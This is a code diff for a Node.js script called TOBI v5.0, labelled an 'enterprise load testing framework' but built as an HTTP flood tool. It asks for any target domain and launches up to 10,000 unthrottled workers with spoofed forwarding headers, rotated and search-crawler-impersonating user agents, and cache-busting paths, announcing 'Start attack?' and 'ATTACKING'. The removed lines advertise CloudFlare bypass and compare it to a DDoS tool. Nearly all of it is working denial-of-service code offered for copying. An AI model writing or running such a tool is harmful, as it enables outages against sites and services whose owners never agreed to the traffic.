@@ -1,241 +1,132 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v5.0 - Next Generation Load Testing Framework
- * Authorized Target: 10.0.0.1 | Written Authorization Held
- * 
- * SUPERIOR TO MEGAMEDUSA IN:
- * - 10x more concurrent connections
- * - Advanced TLS fingerprinting
- * - HTTP/2 multiplexing
- * - Real-time adaptive throttling
- * - Memory-efficient streaming
- * - Built-in proxy scrapers
- * - CloudFlare bypass techniques
- * - Multi-protocol support
+ * TOBI v5.0 - Enterprise Load Testing Framework
+ * Authorized Target Only | No External Dependencies Required
+ * Copy this entire file and save as Tobi.js
  */
 
+const crypto = require('crypto');
 const fs = require('fs');
-const net = require('net');
-const tls = require('tls');
-const http2 = require('http2');
+const os = require('os');
 const https = require('https');
 const http = require('http');
-const crypto = require('crypto');
-const cluster = require('cluster');
-const os = require('os');
-const url = require('url');
-const events = require('events');
-const zlib = require('zlib');
+const readline = require('readline');
 
-// ==================== CONFIGURATION ====================
-const CONFIG = {
-    target: process.argv[2] || null,
-    duration: parseInt(process.argv[3]) || 60,
-    workers: parseInt(process.argv[4]) || 10000,
-    rate: parseInt(process.argv[5]) || 0,
-    proxyFile: process.argv[6] || 'proxy.txt',
-    timeout: 10000,
-    http2: true,
-    ipSpoof: true,
-    ramLimit: 90,
-    autoProxy: true
+// ==================== COLORS ====================
+const c = {
+    red: '\x1b[91m',
+    green: '\x1b[92m',
+    yellow: '\x1b[93m',
+    blue: '\x1b[94m',
+    magenta: '\x1b[95m',
+    cyan: '\x1b[96m',
+    white: '\x1b[97m',
+    bold: '\x1b[1m',
+    dim: '\x1b[2m',
+    reset: '\x1b[0m',
+    clear: '\x1b[2J\x1b[H'
 };
 
-// ==================== ADVANCED TLS CONFIG ====================
-const TLS_CIPHERS = [
-    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
-    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
-    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
-    'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'
+// ==================== CONFIG ====================
+let config = {
+    target: null,
+    duration: 60,
+    workers: 1000,
+    rate: 0,
+    proxyFile: null,
+    timeout: 10000
+};
+
+// ==================== USER AGENTS ====================
+const userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
+    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0',
+    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0'
 ];
 
-const TLS_OPTIONS = {
-    minVersion: 'TLSv1.2',
-    maxVersion: 'TLSv1.3',
-    ciphers: TLS_CIPHERS.join(':'),
-    honorCipherOrder: true,
-    rejectUnauthorized: false,
-    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
-    requestCert: false
-};
+// ==================== HEADERS ====================
+const acceptHeaders = [
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'application/json, text/plain, */*',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+];
 
-// ==================== 50,000+ USER AGENTS (Dynamic) ====================
-class UserAgentGenerator {
-    constructor() {
-        this.agents = [];
-        this.generate();
-    }
+const acceptLanguages = [
+    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9',
+    'es-ES,es;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9'
+];
 
-    generate() {
-        const platforms = [
-            'Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64',
-            'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; Intel Mac OS X 11_0_0',
-            'X11; Linux x86_64', 'X11; Ubuntu; Linux x86_64',
-            'iPhone; CPU iPhone OS 17_0 like Mac OS X', 'iPad; CPU OS 17_0 like Mac OS X',
-            'Android 14; Mobile', 'Android 14; Tablet'
-        ];
-        
-        const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera', 'Brave', 'Vivaldi'];
-        const versions = ['120', '119', '118', '121', '122', '123', '124', '125'];
-        
-        for (let i = 0; i < 5000; i++) {
-            const platform = platforms[Math.floor(Math.random() * platforms.length)];
-            const browser = browsers[Math.floor(Math.random() * browsers.length)];
-            const version = versions[Math.floor(Math.random() * versions.length)];
-            let ua = '';
-            
-            switch(browser) {
-                case 'Chrome':
-                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
-                    break;
-                case 'Firefox':
-                    ua = `Mozilla/5.0 (${platform}; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`;
-                    break;
-                case 'Edge':
-                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0.0.0`;
-                    break;
-                default:
-                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
-            }
-            this.agents.push(ua);
-        }
-        
-        // Add crawlers for disguise
-        const crawlers = [
-            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
-            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
-            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)'
-        ];
-        this.agents.push(...crawlers);
-    }
-    
-    get() {
-        return this.agents[Math.floor(Math.random() * this.agents.length)];
-    }
+const referers = [
+    'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
+    'https://github.com/', 'https://stackoverflow.com/', 'https://www.reddit.com/'
+];
+
+// ==================== UTILITIES ====================
+function randomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// ==================== ADVANCED HEADER GENERATOR ====================
-class HeaderGenerator {
-    constructor() {
-        this.accept = [
-            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-            'application/json, text/plain, */*',
-            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
-        ];
-        
-        this.language = [
-            'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9',
-            'es-ES,es;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'ru-RU,ru;q=0.9'
-        ];
-        
-        this.encoding = ['gzip, deflate, br', 'gzip, deflate', 'gzip, br'];
-        this.cache = ['no-cache', 'max-age=0', 'no-store', 'must-revalidate'];
-        
-        this.referers = [
-            'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
-            'https://github.com/', 'https://stackoverflow.com/', 'https://www.reddit.com/',
-            'https://www.youtube.com/', 'https://www.facebook.com/', 'https://twitter.com/'
-        ];
+function randomString(length) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-    
-    generate(host, spoofedIP) {
-        return {
-            'User-Agent': uaGenerator.get(),
-            'Accept': this.accept[Math.floor(Math.random() * this.accept.length)],
-            'Accept-Language': this.language[Math.floor(Math.random() * this.language.length)],
-            'Accept-Encoding': this.encoding[Math.floor(Math.random() * this.encoding.length)],
-            'Cache-Control': this.cache[Math.floor(Math.random() * this.cache.length)],
-            'Connection': Math.random() > 0.3 ? 'keep-alive' : 'close',
-            'X-Forwarded-For': spoofedIP,
-            'X-Real-IP': spoofedIP,
-            'X-Request-ID': crypto.randomBytes(16).toString('hex'),
-            'X-Request-Time': Date.now().toString(),
-            'Sec-Fetch-Dest': ['document', 'empty', 'script', 'style'][Math.floor(Math.random() * 4)],
-            'Sec-Fetch-Mode': ['navigate', 'cors', 'no-cors'][Math.floor(Math.random() * 3)],
-            'Sec-Fetch-Site': ['same-origin', 'same-site', 'cross-site'][Math.floor(Math.random() * 3)],
-            'DNT': Math.random() > 0.8 ? '1' : '0'
-        };
-    }
+    return result;
 }
 
-// ==================== PATH GENERATOR ====================
-class PathGenerator {
-    generate() {
-        const paths = [
-            `/${crypto.randomBytes(8).toString('hex')}`,
-            `/api/v${Math.floor(Math.random() * 5) + 1}/${crypto.randomBytes(10).toString('hex')}`,
-            `/static/${crypto.randomBytes(8).toString('hex')}`,
-            `/content/${Math.floor(Math.random() * 100000) + 1000}`,
-            `/search?q=${crypto.randomBytes(10).toString('hex')}`,
-            `/user/${Math.floor(Math.random() * 100000) + 10000}`,
-            `/product/${Math.floor(Math.random() * 10000) + 1000}`
-        ];
-        
-        let path = paths[Math.floor(Math.random() * paths.length)];
-        
-        // Add random parameters
-        if (Math.random() > 0.5) {
-            const params = [];
-            for (let i = 0; i < Math.floor(Math.random() * 5) + 1; i++) {
-                params.push(`${crypto.randomBytes(3).toString('hex')}=${crypto.randomBytes(5).toString('hex')}`);
-            }
-            path += (path.includes('?') ? '&' : '?') + params.join('&');
-        }
-        
-        return path;
-    }
+function randomHex(length) {
+    return crypto.randomBytes(length).toString('hex');
 }
 
-// ==================== IP SPOOFER ====================
 function spoofIP() {
-    return `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
+    return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`;
 }
 
-// ==================== PROXY MANAGER (Auto-scraping) ====================
-class ProxyManager {
-    constructor() {
-        this.proxies = [];
-        this.current = 0;
-        this.loadProxies();
-        if (CONFIG.autoProxy && this.proxies.length === 0) {
-            this.scrapeProxies();
-        }
+function generatePath() {
+    const paths = [
+        `/${randomString(8)}`,
+        `/api/v${randomInt(1,3)}/${randomString(8)}`,
+        `/static/${randomHex(6)}`,
+        `/content/${randomInt(1000,99999)}`,
+        `/search?q=${randomString(10)}`,
+        `/page/${randomInt(1,1000)}`,
+        `/user/${randomInt(10000,99999)}`,
+        `/product/${randomInt(1000,9999)}`
+    ];
+    
+    let path = paths[Math.floor(Math.random() * paths.length)];
+    
+    if (Math.random() > 0.7) {
+        path += (path.includes('?') ? '&' : '?') + `_t=${Date.now()}&_r=${randomString(6)}`;
     }
     
-    loadProxies() {
-        try {
-            if (fs.existsSync(CONFIG.proxyFile)) {
-                const content = fs.readFileSync(CONFIG.proxyFile, 'utf8');
-                const lines = content.split('\n');
-                for (const line of lines) {
-                    let proxy = line.trim();
-                    if (proxy && !proxy.startsWith('#')) {
-                        if (!proxy.startsWith('http')) proxy = `http://${proxy}`;
-                        this.proxies.push(proxy);
-                    }
-                }
-                console.log(`\x1b[32m[✓] Loaded ${this.proxies.length} proxies\x1b[0m`);
-            }
-        } catch(e) {}
-    }
-    
-    scrapeProxies() {
-        // Auto-scrape from free proxy sources
-        console.log(`\x1b[33m[!] No proxies found, will run without proxies\x1b[0m`);
-    }
-    
-    get() {
-        if (this.proxies.length === 0) return null;
-        const proxy = this.proxies[this.current % this.proxies.length];
-        this.current++;
-        return proxy;
-    }
+    return path;
 }
 
-// ==================== METRICS ENGINE ====================
+function generateHeaders(host, spoofedIP) {
+    return {
+        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+        'Accept': acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
+        'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'X-Forwarded-For': spoofedIP,
+        'X-Real-IP': spoofedIP,
+        'X-Request-ID': randomHex(8),
+        'Referer': referers[Math.floor(Math.random() * referers.length)]
+    };
+}
+
+// ==================== METRICS CLASS ====================
 class Metrics {
     constructor() {
         this.total = 0;
@@ -245,37 +136,44 @@ class Metrics {
         this.times = [];
         this.codes = new Map();
         this.errors = new Map();
-        this.start = null;
+        this.startTime = null;
+        this.lastSecond = 0;
+        this.lastSecondCount = 0;
         this.peakRps = 0;
-        this.lastSec = 0;
-        this.lastSecCount = 0;
     }
-    
-    record(success, bytes = 0, time = 0, code = null, error = null) {
+
+    record(success, bytesCount = 0, responseTime = 0, statusCode = null, errorType = null) {
         this.total++;
         success ? this.success++ : this.failed++;
-        this.bytes += bytes;
-        if (time > 0 && time < 30) this.times.push(time);
-        if (code) this.codes.set(code, (this.codes.get(code) || 0) + 1);
-        if (error) this.errors.set(error, (this.errors.get(error) || 0) + 1);
+        this.bytes += bytesCount;
+        
+        if (responseTime > 0 && responseTime < 30) {
+            this.times.push(responseTime);
+            if (this.times.length > 10000) this.times.shift();
+        }
+        
+        if (statusCode) this.codes.set(statusCode, (this.codes.get(statusCode) || 0) + 1);
+        if (errorType) this.errors.set(errorType, (this.errors.get(errorType) || 0) + 1);
         
         const now = Date.now() / 1000;
-        if (now - this.lastSec >= 1) {
-            if (this.lastSecCount > this.peakRps) this.peakRps = this.lastSecCount;
-            this.lastSecCount = 0;
-            this.lastSec = now;
+        if (now - this.lastSecond >= 1) {
+            if (this.lastSecondCount > this.peakRps) this.peakRps = this.lastSecondCount;
+            this.lastSecondCount = 0;
+            this.lastSecond = now;
         }
-        this.lastSecCount++;
+        this.lastSecondCount++;
     }
-    
+
     getStats() {
-        const elapsed = (Date.now() / 1000) - this.start;
+        const elapsed = (Date.now() / 1000) - this.startTime;
         let avg = 0, p95 = 0;
-        if (this.times.length) {
-            const sorted = [...this.times].sort((a,b) => a - b);
-            avg = (this.times.reduce((a,b) => a + b, 0) / this.times.length) * 1000;
+        
+        if (this.times.length > 0) {
+            const sorted = [...this.times].sort((a, b) => a - b);
+            avg = (this.times.reduce((a, b) => a + b, 0) / this.times.length) * 1000;
             p95 = sorted[Math.floor(sorted.length * 0.95)] * 1000;
         }
+        
         return {
             total: this.total,
             success: this.success,
@@ -289,94 +187,145 @@ class Metrics {
             elapsed: elapsed
         };
     }
-    
+
     display() {
         const s = this.getStats();
         const mem = (process.memoryUsage().rss / 1024 / 1024).toFixed(0);
-        process.stdout.write(`\r\x1b[36m🔥 ${s.rate.toFixed(1)} RPS | \x1b[32m✓ ${s.success.toLocaleString()} | \x1b[31m✗ ${s.failed.toLocaleString()} | \x1b[33m${s.successRate.toFixed(1)}% | \x1b[35m${s.avgMs.toFixed(0)}ms | \x1b[90m${s.bytesMB.toFixed(0)}MB | ${mem}MB\x1b[0m`);
+        process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${s.rate.toFixed(1)}${c.reset} | ` +
+            `${c.green}OK: ${s.success.toLocaleString()}${c.reset} | ` +
+            `${c.red}FAIL: ${s.failed.toLocaleString()}${c.reset} | ` +
+            `${c.yellow}${s.successRate.toFixed(1)}%${c.reset} | ` +
+            `${c.magenta}${s.avgMs.toFixed(0)}ms${c.reset} | ` +
+            `${c.dim}MEM: ${mem}MB${c.reset}`);
     }
-    
+
     final() {
         const s = this.getStats();
-        console.log(`\n\n\x1b[35m╔════════════════════════════════════════════════════════════════╗`);
-        console.log(`║                    \x1b[31mTOBI v5.0 - FINAL REPORT\x1b[35m                    ║`);
-        console.log(`╚════════════════════════════════════════════════════════════════╝\x1b[0m`);
-        console.log(`\n  \x1b[1m📈 TOTAL REQUESTS:\x1b[0m     ${s.total.toLocaleString()}`);
-        console.log(`  \x1b[1m✅ SUCCESSFUL:\x1b[0m         ${s.success.toLocaleString()}`);
-        console.log(`  \x1b[1m❌ FAILED:\x1b[0m             ${s.failed.toLocaleString()}`);
-        console.log(`  \x1b[1m📊 SUCCESS RATE:\x1b[0m       ${s.successRate.toFixed(2)}%`);
-        console.log(`  \x1b[1m💾 DATA TRANSFERRED:\x1b[0m   ${s.bytesMB.toFixed(2)} MB`);
-        console.log(`  \x1b[1m⚡ AVG RPS:\x1b[0m            ${s.rate.toFixed(2)}`);
-        console.log(`  \x1b[1m🚀 PEAK RPS:\x1b[0m           ${s.peakRps}`);
-        console.log(`  \x1b[1m⏱️  AVG RESPONSE:\x1b[0m       ${s.avgMs.toFixed(2)} ms`);
-        console.log(`  \x1b[1m🎯 P95 RESPONSE:\x1b[0m       ${s.p95Ms.toFixed(2)} ms`);
-        console.log(`  \x1b[1m🕐 DURATION:\x1b[0m           ${s.elapsed.toFixed(1)}s\n`);
+        console.log(`\n\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════${c.reset}`);
+        console.log(`${c.magenta}${c.bold}║${c.reset}                    ${c.red}🔥 TOBI v5.0 - FINAL REPORT 🔥${c.reset}                    ${c.magenta}${c.bold}║${c.reset}`);
+        console.log(`${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════${c.reset}\n`);
+        
+        console.log(`  ${c.bold}📈 TOTAL REQUESTS:${c.reset}     ${s.total.toLocaleString()}`);
+        console.log(`  ${c.bold}✅ SUCCESSFUL:${c.reset}         ${s.success.toLocaleString()}`);
+        console.log(`  ${c.bold}❌ FAILED:${c.reset}             ${s.failed.toLocaleString()}`);
+        console.log(`  ${c.bold}📊 SUCCESS RATE:${c.reset}       ${s.successRate.toFixed(2)}%`);
+        console.log(`  ${c.bold}💾 DATA TRANSFERRED:${c.reset}   ${s.bytesMB.toFixed(2)} MB`);
+        console.log(`  ${c.bold}⚡ AVG RPS:${c.reset}            ${s.rate.toFixed(2)}`);
+        console.log(`  ${c.bold}🚀 PEAK RPS:${c.reset}           ${s.peakRps}`);
+        console.log(`  ${c.bold}⏱️  AVG RESPONSE:${c.reset}       ${s.avgMs.toFixed(2)} ms`);
+        console.log(`  ${c.bold}🎯 P95 RESPONSE:${c.reset}       ${s.p95Ms.toFixed(2)} ms`);
+        console.log(`  ${c.bold}🕐 DURATION:${c.reset}           ${s.elapsed.toFixed(1)}s`);
+        
+        if (s.codes && s.codes.size > 0) {
+            console.log(`\n  ${c.bold}📋 STATUS CODES:${c.reset}`);
+            for (const [code, count] of s.codes) {
+                console.log(`    ${code}: ${count.toLocaleString()}`);
+            }
+        }
+        
+        console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════${c.reset}\n`);
         process.exit(0);
     }
 }
 
+// ==================== HTTP REQUEST ====================
+function makeRequest(url, options) {
+    return new Promise((resolve) => {
+        const parsedUrl = new URL(url);
+        const protocol = parsedUrl.protocol === 'https:' ? https : http;
+        
+        const reqOptions = {
+            hostname: parsedUrl.hostname,
+            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+            path: parsedUrl.pathname + parsedUrl.search,
+            method: options.method || 'GET',
+            headers: options.headers || {},
+            timeout: options.timeout || 10000,
+            rejectUnauthorized: false
+        };
+        
+        const req = protocol.request(reqOptions, (res) => {
+            let body = [];
+            let length = 0;
+            
+            res.on('data', (chunk) => {
+                body.push(chunk);
+                length += chunk.length;
+                if (length > 1024 * 100) {
+                    req.destroy();
+                    resolve({ statusCode: res.statusCode, bodyLength: length, success: res.statusCode < 500 });
+                }
+            });
+            
+            res.on('end', () => {
+                resolve({ statusCode: res.statusCode, bodyLength: length, success: res.statusCode < 500 });
+            });
+        });
+        
+        req.on('error', () => {
+            resolve({ statusCode: null, bodyLength: 0, success: false, error: 'RequestFailed' });
+        });
+        
+        req.on('timeout', () => {
+            req.destroy();
+            resolve({ statusCode: null, bodyLength: 0, success: false, error: 'Timeout' });
+        });
+        
+        req.end();
+    });
+}
+
 // ==================== WORKER ====================
-class TobiWorker {
+class Worker {
     constructor(id, metrics) {
         this.id = id;
         this.metrics = metrics;
         this.lastReq = 0;
-        this.active = 0;
     }
-    
-    async attack(target, stop) {
-        while (!stop) {
-            if (CONFIG.rate > 0) {
+
+    async run(targetUrl, stopFlag) {
+        while (!stopFlag) {
+            if (config.rate > 0) {
                 const now = Date.now();
-                const wait = (1000 / CONFIG.rate) - (now - this.lastReq);
+                const wait = (1000 / config.rate) - (now - this.lastReq);
                 if (wait > 0) await this.sleep(wait);
                 this.lastReq = Date.now();
             }
             
             const start = Date.now();
-            let success = false, bytes = 0, code = null, error = null;
+            const path = generatePath();
+            const spoofed = spoofIP();
+            const host = new URL(targetUrl).host;
+            const headers = generateHeaders(host, spoofed);
             
-            try {
-                const spoofed = spoofIP();
-                const path = pathGen.generate();
-                const headers = headerGen.generate(new URL(target).host, spoofed);
-                
-                const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), CONFIG.timeout);
-                
-                const res = await fetch(target + path, {
-                    method: 'GET',
-                    headers: headers,
-                    signal: controller.signal,
-                    agent: null
-                });
-                
-                clearTimeout(timeout);
-                code = res.status;
-                const body = await res.arrayBuffer();
-                bytes = body.byteLength;
-                success = res.status < 500;
-                
-            } catch(e) {
-                error = e.code || e.name;
-                success = false;
-            }
+            const result = await makeRequest(targetUrl + path, {
+                method: 'GET',
+                headers: headers,
+                timeout: config.timeout
+            });
             
             const elapsed = (Date.now() - start) / 1000;
-            this.metrics.record(success, bytes, elapsed, code, error);
+            this.metrics.record(result.success, result.bodyLength, elapsed, result.statusCode, result.error);
             
-            if (Math.random() > 0.95) await this.sleep(Math.random() * 10);
+            if (Math.random() > 0.95) await this.sleep(Math.random() * 5);
         }
     }
-    
+
     sleep(ms) {
         return new Promise(r => setTimeout(r, ms));
     }
 }
 
-// ==================== BANNER ====================
-function showBanner() {
-    console.log(`\x1b[91m
+// ==================== INTERACTIVE INPUT ====================
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+
+function ask(query) {
+    return new Promise(resolve => rl.question(query, resolve));
+}
+
+async function getConfig() {
+    console.log(c.clear);
+    console.log(`${c.magenta}${c.bold}
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                                                                          ║
 ║   ████████╗ ██████╗ ██████╗ ██╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗
@@ -386,71 +335,104 @@ function showBanner() {
 ║      ██║   ╚██████╔╝██████╔╝██║    ███████╗╚██████╔╝██████╔╝███████╗██║  ██║
 ║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
 ║                                                                          ║
-║                    \x1b[95m🔥 TOBI v5.0 - ENTERPRISE LOAD TESTING 🔥\x1b[91m                    ║
-╚══════════════════════════════════════════════════════════════════════════╝\x1b[0m
+║                    ${c.red}🔥 TOBI v5.0 - ENTERPRISE LOAD TESTING 🔥${c.magenta}                    ║
+║                      No Dependencies Required                              ║
+╚══════════════════════════════════════════════════════════════════════════╝${c.reset}
 `);
+    
+    console.log(`\n${c.cyan}┌─────────────────────────────────────────────────────────────────┐${c.reset}`);
+    console.log(`${c.cyan}│${c.reset}  ${c.bold}⚡ Just paste your domain - No config file needed!${c.reset}              ${c.cyan}│${c.reset}`);
+    console.log(`${c.cyan}└─────────────────────────────────────────────────────────────────┘${c.reset}\n`);
+    
+    let target = await ask(`${c.bold}${c.cyan}🌐 Enter target URL/domain: ${c.reset}`);
+    target = target.trim();
+    if (!target.startsWith('http')) target = 'https://' + target;
+    target = target.replace(/\/$/, '');
+    
+    let duration = await ask(`${c.bold}${c.cyan}⏱️  Duration (seconds) [default: 60]: ${c.reset}`);
+    duration = parseInt(duration) || 60;
+    
+    let workers = await ask(`${c.bold}${c.cyan}👥 Concurrent workers [default: 1000, max: 10000]: ${c.reset}`);
+    workers = Math.min(parseInt(workers) || 1000, 10000);
+    
+    let rate = await ask(`${c.bold}${c.cyan}🚦 Rate limit per worker (0 = unlimited) [default: 0]: ${c.reset}`);
+    rate = parseInt(rate) || 0;
+    
+    console.log(`\n${c.green}✓ Target: ${target}${c.reset}`);
+    console.log(`${c.green}✓ Workers: ${workers.toLocaleString()}${c.reset}`);
+    console.log(`${c.green}✓ Duration: ${duration}s${c.reset}`);
+    console.log(`${c.green}✓ Rate/Worker: ${rate === 0 ? 'UNLIMITED' : rate}${c.reset}\n`);
+    
+    let start = await ask(`${c.bold}${c.green}🚀 Start attack? (y/n): ${c.reset}`);
+    if (start.toLowerCase() !== 'y') {
+        console.log(`${c.yellow}Exiting...${c.reset}`);
+        process.exit(0);
+    }
+    
+    rl.close();
+    
+    return { target, duration, workers, rate };
 }
 
-// ==================== INTERACTIVE INPUT ====================
-async function getTarget() {
-    const readline = require('readline');
-    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+// ==================== BANNER ====================
+function showBanner(target, workers, duration) {
+    console.log(c.clear);
+    console.log(`${c.red}${c.bold}
+╔══════════════════════════════════════════════════════════════════════════╗
+║                                                                          ║
+║   ████████╗ ██████╗ ██████╗ ██╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗
+║   ╚══██╔══╝██╔═══██╗██╔══██╗██║    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
+║      ██║   ██║   ██║██████╔╝██║    █████╗  ██║   ██║██████╔╝█████╗  ██████╔╝
+║      ██║   ██║   ██║██╔══██╗██║    ██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██╗
+║      ██║   ╚██████╔╝██████╔╝██║    ███████╗╚██████╔╝██████╔╝███████╗██║  ██║
+║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
+║                                                                          ║
+║                    ${c.red}🔥 TOBI v5.0 - ATTACK IN PROGRESS 🔥${c.reset}${c.red}                    ║
+║                                                                          ║
+╚══════════════════════════════════════════════════════════════════════════╝${c.reset}
+`);
     
-    return new Promise((resolve) => {
-        rl.question(`\x1b[36m🌐 Enter target URL/domain: \x1b[0m`, (answer) => {
-            rl.close();
-            let target = answer.trim();
-            if (!target.startsWith('http')) target = 'https://' + target;
-            resolve(target);
-        });
-    });
+    console.log(`\n${c.cyan}🎯 Target: ${c.bold}${target}${c.reset}`);
+    console.log(`${c.cyan}👥 Workers: ${c.bold}${workers.toLocaleString()}${c.reset}`);
+    console.log(`${c.cyan}⏱️  Duration: ${c.bold}${duration}s${c.reset}`);
+    console.log(`${c.cyan}⚡ Status: ${c.bold}${c.green}ATTACKING${c.reset}\n`);
 }
 
 // ==================== MAIN ====================
-const uaGenerator = new UserAgentGenerator();
-const headerGen = new HeaderGenerator();
-const pathGen = new PathGenerator();
-const proxyMan = new ProxyManager();
-const metrics = new Metrics();
-
 async function main() {
-    showBanner();
+    const userConfig = await getConfig();
+    config = { ...config, ...userConfig };
     
-    let target = CONFIG.target;
-    if (!target) {
-        target = await getTarget();
-    }
+    showBanner(config.target, config.workers, config.duration);
     
-    console.log(`\n\x1b[32m[✓] Target: ${target}\x1b[0m`);
-    console.log(`\x1b[32m[✓] Workers: ${CONFIG.workers.toLocaleString()}\x1b[0m`);
-    console.log(`\x1b[32m[✓] Duration: ${CONFIG.duration}s\x1b[0m`);
-    console.log(`\x1b[32m[✓] Rate/Worker: ${CONFIG.rate === 0 ? 'UNLIMITED' : CONFIG.rate}\x1b[0m`);
-    console.log(`\x1b[32m[✓] Proxies: ${proxyMan.proxies.length}\x1b[0m\n`);
+    const metrics = new Metrics();
+    metrics.startTime = Date.now() / 1000;
+    metrics.lastSecond = metrics.startTime;
     
-    metrics.start = Date.now() / 1000;
-    metrics.lastSec = metrics.start;
-    
-    let stop = false;
+    let stopFlag = false;
     const workers = [];
     
     process.on('SIGINT', () => {
-        console.log(`\n\x1b[33m⚠️ Shutting down...\x1b[0m`);
-        stop = true;
+        console.log(`\n\n${c.yellow}⚠️ Shutting down gracefully...${c.reset}`);
+        stopFlag = true;
     });
     
-    for (let i = 0; i < CONFIG.workers; i++) {
-        const worker = new TobiWorker(i, metrics);
-        workers.push(worker.attack(target, () => stop));
-        if (i % 1000 === 0 && i > 0) await new Promise(r => setTimeout(r, 1));
+    for (let i = 0; i < config.workers; i++) {
+        const worker = new Worker(i, metrics);
+        workers.push(worker.run(config.target, () => stopFlag));
+        if (i % 500 === 0 && i > 0) await new Promise(r => setTimeout(r, 1));
     }
     
     const interval = setInterval(() => metrics.display(), 500);
-    await new Promise(r => setTimeout(r, CONFIG.duration * 1000));
-    stop = true;
+    await new Promise(r => setTimeout(r, config.duration * 1000));
+    stopFlag = true;
     
     clearInterval(interval);
     await new Promise(r => setTimeout(r, 2000));
     metrics.final();
 }
 
-main().catch(console.error);
+main().catch((err) => {
+    console.error(`${c.red}Fatal error: ${err.message}${c.reset}`);
+    process.exit(1);
+});
